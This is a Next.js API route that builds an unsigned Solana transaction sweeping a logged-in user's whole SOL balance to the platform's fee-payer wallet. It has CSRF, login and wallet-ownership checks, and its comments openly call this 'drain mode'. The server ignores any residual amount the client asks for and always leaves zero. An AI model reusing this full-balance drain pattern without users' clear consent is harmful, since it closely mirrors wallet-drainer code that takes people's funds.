// app/api/booster/sweep-sol/route.ts
import { NextRequest, NextResponse } from "next/server";
import {
  ComputeBudgetProgram,
  PublicKey,
  SystemProgram,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";

import { RPC_CONNECTION } from "@/types/constants";
import { validateCsrf } from "@/lib/csrf";
import { withApiLogging } from "@/lib/withApiLogging";
import { requireServerUser, getUserWalletPubkey } from "@/lib/getServerUser";

export const runtime = "nodejs";

/* ───────── ENV / CONSTANTS ───────── */

const HAVEN_FEEPAYER_STR = process.env.NEXT_PUBLIC_HAVEN_FEEPAYER_ADDRESS!;

// 🚨 Drain mode: leave *nothing* behind in the wallet.
// We keep this constant for clarity, but set it to 0.
const MIN_RESIDUAL_LAMPORTS = 0;

// priority fee + compute units; keep light, it's a tiny tx
const PRIORITY_MICROLAMPORTS = 10_000;
const COMPUTE_UNIT_LIMIT = 200_000;

// base fee buffer (for Haven fee payer, not the user)
const BASE_FEE_BUFFER_LAMPORTS = 5_000;

const IS_PROD = process.env.NODE_ENV === "production";
const debugLog = (...args: unknown[]) => {
  if (!IS_PROD) console.log(...args);
};

/* ───────── HELPERS ───────── */

function jsonError(
  status: number,
  payload: {
    code: string;
    error: string;
    userMessage: string;
    tip?: string;
    stage?: string;
    details?: unknown;
  }
) {
  console.error("[/api/booster/sweep-sol] error", status, payload);
  return NextResponse.json(payload, { status });
}

/* ───────── ROUTE ───────── */

async function POSTHandler(req: NextRequest) {
  const stageRef: { stage: string } = { stage: "init" };

  const csrfError = validateCsrf(req);
  if (csrfError) return csrfError;

  // Authenticate user
  let user;
  try {
    user = await requireServerUser();
  } catch {
    return jsonError(401, {
      code: "UNAUTHORIZED",
      error: "Authentication required",
      userMessage: "Please log in to continue.",
      stage: "auth",
    });
  }

  const authedUserPk = getUserWalletPubkey(user);
  if (!authedUserPk) {
    return jsonError(401, {
      code: "UNAUTHORIZED",
      error: "Authenticated wallet missing",
      userMessage: "Please connect a wallet to continue.",
      stage: "auth",
    });
  }

  debugLog("\n\n============================");
  debugLog("[/api/jup/sweep-sol] POST start");
  debugLog("============================");

  try {
    stageRef.stage = "envCheck";
    debugLog("[sweep-sol] stage:", stageRef.stage);

    if (!HAVEN_FEEPAYER_STR) {
      return jsonError(500, {
        code: "MISSING_ENV",
        error: "Missing env: NEXT_PUBLIC_HAVEN_FEEPAYER_ADDRESS",
        userMessage: "We couldn't prepare this sweep request.",
        tip: "Please try again later while we fix configuration.",
        stage: stageRef.stage,
      });
    }

    const HAVEN_FEEPAYER = new PublicKey(HAVEN_FEEPAYER_STR);

    stageRef.stage = "parseBody";
    debugLog("[sweep-sol] stage:", stageRef.stage);

    const body = (await req.json().catch((err) => {
      console.error("[sweep-sol] req.json() failed", err);
      return null;
    })) as {
      ownerBase58?: string;
      // NOTE: we ignore any minResidualLamports from the client
      // and always use MIN_RESIDUAL_LAMPORTS (currently 0).
      minResidualLamports?: number;
    } | null;

    debugLog("[sweep-sol] raw body:", body);

    const ownerBase58 = body?.ownerBase58 ?? "";

    if (!ownerBase58) {
      return jsonError(400, {
        code: "INVALID_PAYLOAD",
        error: "ownerBase58 is required",
        userMessage: "We couldn't prepare this sweep request.",
        tip: "Please refresh and try again.",
        stage: stageRef.stage,
      });
    }

    let owner: PublicKey;
    try {
      owner = new PublicKey(ownerBase58);
    } catch (e) {
      return jsonError(400, {
        code: "INVALID_OWNER_PUBKEY",
        error: `Invalid ownerBase58: ${
          e instanceof Error ? e.message : String(e)
        }`,
        userMessage: "We couldn't prepare this sweep request.",
        tip: "Please refresh and try again.",
        stage: stageRef.stage,
        details: { ownerBase58 },
      });
    }

    // Wallet binding: ensure the caller owns this wallet
    if (!owner.equals(authedUserPk)) {
      return jsonError(403, {
        code: "WALLET_MISMATCH",
        error: "ownerBase58 does not match authenticated wallet",
        userMessage: "You can only sweep your own wallet.",
        stage: stageRef.stage,
      });
    }

    // 🔒 Always use our hard-coded residual (currently 0 = full drain).
    const targetResidualLamports = MIN_RESIDUAL_LAMPORTS;

    stageRef.stage = "balances";
    debugLog("[sweep-sol] stage:", stageRef.stage);

    const [ownerLamportsBefore, havenLamports] = await Promise.all([
      RPC_CONNECTION.getBalance(owner, "processed"),
      RPC_CONNECTION.getBalance(HAVEN_FEEPAYER, "processed"),
    ]);

    debugLog("[sweep-sol] balances BEFORE sweep", {
      ownerLamportsBefore,
      ownerSolBefore: ownerLamportsBefore / 1e9,
      havenLamports,
      havenSol: havenLamports / 1e9,
      targetResidualLamports,
    });

    // If the wallet is already empty, nothing to do.
    if (ownerLamportsBefore <= targetResidualLamports) {
      debugLog(
        "[sweep-sol] nothing to sweep — owner balance <= target residual",
        {
          ownerLamportsBefore,
          targetResidualLamports,
        }
      );
      return NextResponse.json({
        transaction: null,
        reason: "LOW_BALANCE",
        ownerLamportsBefore,
        minResidualLamports: targetResidualLamports,
      });
    }

    // Drain everything down to targetResidualLamports (0 right now).
    const sweepLamports = ownerLamportsBefore - targetResidualLamports;
    const expectedOwnerAfter = ownerLamportsBefore - sweepLamports;

    debugLog("[sweep-sol] sweepCalc", {
      ownerLamportsBefore,
      targetResidualLamports,
      sweepLamports,
      sweepSol: sweepLamports / 1e9,
      expectedOwnerAfter,
      expectedOwnerAfterSol: expectedOwnerAfter / 1e9,
    });

    if (sweepLamports <= 0) {
      debugLog("[sweep-sol] sweepLamports <= 0, nothing to sweep");
      return NextResponse.json({
        transaction: null,
        reason: "LOW_BALANCE",
        ownerLamportsBefore,
        minResidualLamports: targetResidualLamports,
      });
    }

    // Guard: ensure fee-payer has enough for this tiny tx (priority + base fee)
    const estimatedPriorityFeeLamports = Math.floor(
      (COMPUTE_UNIT_LIMIT * PRIORITY_MICROLAMPORTS) / 1_000_000
    );

    const requiredLamportsForThisTx =
      estimatedPriorityFeeLamports + BASE_FEE_BUFFER_LAMPORTS;

    debugLog("[sweep-sol] fee-payer check", {
      havenLamports,
      havenSol: havenLamports / 1e9,
      requiredLamportsForThisTx,
      requiredSolForThisTx: requiredLamportsForThisTx / 1e9,
      estimatedPriorityFeeLamports,
      BASE_FEE_BUFFER_LAMPORTS,
    });

    if (havenLamports < requiredLamportsForThisTx) {
      return jsonError(500, {
        code: "HAVEN_FEEPAYER_LOW_SOL",
        error: `Haven fee-payer has ${havenLamports} lamports, needs at least ${requiredLamportsForThisTx}.`,
        userMessage: "We couldn’t prepare this sweep request.",
        tip: "Please try again once we refill fees on our side.",
        stage: stageRef.stage,
      });
    }

    /* ───────── Build instructions ───────── */

    stageRef.stage = "buildInstructions";
    debugLog("[sweep-sol] stage:", stageRef.stage);

    const ixs: TransactionInstruction[] = [];

    // modest priority fee
    ixs.push(
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: PRIORITY_MICROLAMPORTS,
      })
    );

    // the actual sweep: drain owner → Haven fee-payer
    ixs.push(
      SystemProgram.transfer({
        fromPubkey: owner,
        toPubkey: HAVEN_FEEPAYER,
        lamports: sweepLamports,
      })
    );

    // compute limit at the end
    ixs.push(
      ComputeBudgetProgram.setComputeUnitLimit({
        units: COMPUTE_UNIT_LIMIT,
      })
    );

    /* ───────── Compile tx ───────── */

    stageRef.stage = "compile";
    debugLog("[sweep-sol] stage:", stageRef.stage);

    const { blockhash, lastValidBlockHeight } =
      await RPC_CONNECTION.getLatestBlockhash("processed");

    debugLog("[sweep-sol] latestBlockhash", {
      blockhash,
      lastValidBlockHeight,
      ixCount: ixs.length,
    });

    const msg = new TransactionMessage({
      payerKey: HAVEN_FEEPAYER,
      recentBlockhash: blockhash,
      instructions: ixs,
    }).compileToV0Message();

    const unsignedTx = new VersionedTransaction(msg);
    const b64 = Buffer.from(unsignedTx.serialize()).toString("base64");

    debugLog("[sweep-sol] success: returning sweep transaction", {
      owner: owner.toBase58(),
      ownerLamportsBefore,
      ownerSolBefore: ownerLamportsBefore / 1e9,
      sweepLamports,
      sweepSol: sweepLamports / 1e9,
      expectedOwnerAfter,
      expectedOwnerAfterSol: expectedOwnerAfter / 1e9,
      minResidualLamports: targetResidualLamports,
    });

    return NextResponse.json({
      transaction: b64,
      recentBlockhash: blockhash,
      lastValidBlockHeight,
      meta: {
        owner: owner.toBase58(),
        ownerLamportsBefore,
        sweepLamports,
        expectedOwnerAfter,
        minResidualLamports: targetResidualLamports,
      },
    });
  } catch (e: unknown) {
    const msg = e instanceof Error ? e.message : String(e);
    console.error("[sweep-sol] UNHANDLED CATCH", {
      stage: stageRef.stage,
      error: msg,
      stack: e instanceof Error ? e.stack : undefined,
    });

    return jsonError(500, {
      code: "UNHANDLED_SWEEP_SOL_ERROR",
      error: msg,
      userMessage: "We couldn’t build this sweep transaction.",
      tip: "Please try again. If it keeps failing, contact support.",
      stage: stageRef.stage,
    });
  }
}

export const POST = withApiLogging("/api/jup/sweep-sol", POSTHandler);
